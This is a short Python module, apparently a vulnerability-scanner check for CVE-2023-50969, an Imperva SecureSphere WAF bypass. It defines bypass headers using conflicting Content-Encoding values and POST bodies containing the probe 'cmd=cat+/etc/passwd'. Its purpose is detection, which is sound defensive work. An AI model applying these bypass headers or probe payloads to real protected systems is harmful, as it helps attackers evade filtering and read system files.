"""Agent Asteroid implementation for CVE-2023-50969"""

import re

from agent import definitions
from agent import exploits_registry
from agent.exploits import webexploit

VULNERABILITY_TITLE = "Imperva SecureSphere WAF Bypass for POST Data Inspection Rules"
VULNERABILITY_REFERENCE = "CVE-2023-50969"
VULNERABILITY_DESCRIPTION = (
    "An attacker is able to bypass WAF rules that inspect POST data and would be able to successfully exploit "
    "existing vulnerabilities in protected applications that would otherwise be blocked."
)
RISK_RATING = "MEDIUM"

BYPASS_HEADERS = {"Content-Encoding": "Hello Imperva", "content-encoding": "gzip"}


@exploits_registry.register
class CVE202350969Exploit(webexploit.WebExploit):
    accept_request = definitions.Request(
        method="POST", path="/a", data=b"cmd=cat+/etc/passwd"
    )
    check_request = definitions.Request(
        method="POST",
        path="/b",
        headers=BYPASS_HEADERS,
        data=b"qand=notu&cmd=cat+/etc/passwd",
    )
    accept_pattern = [re.compile("The event ID is: \d+. The incident ID is: .*")]
    match_pattern = [re.compile(r"^(?!.*incident).*$")]
    metadata = definitions.VulnerabilityMetadata(
        title=VULNERABILITY_TITLE,
        description=VULNERABILITY_DESCRIPTION,
        reference=VULNERABILITY_REFERENCE,
        risk_rating=RISK_RATING,
        cve_ids=["CVE-2023-50969"],
    )
